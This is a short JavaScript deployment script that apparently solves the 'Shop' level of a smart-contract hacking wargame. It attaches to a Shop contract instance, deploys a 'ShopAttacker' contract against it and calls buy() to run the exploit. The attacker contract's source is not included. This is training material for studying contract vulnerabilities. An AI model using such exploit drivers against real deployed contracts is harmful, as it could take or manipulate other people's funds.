const {BLOCK_EXPLORER_URL, SHOP_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Shop level');

    if (!SHOP_INSTANCE_ADDRESS) {
        console.log('Shop instance address not found');
        return;
    }

    console.log('Shop instance address', SHOP_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Shop");
    const contract = factory.attach(SHOP_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("ShopAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.buy();
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Shop level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
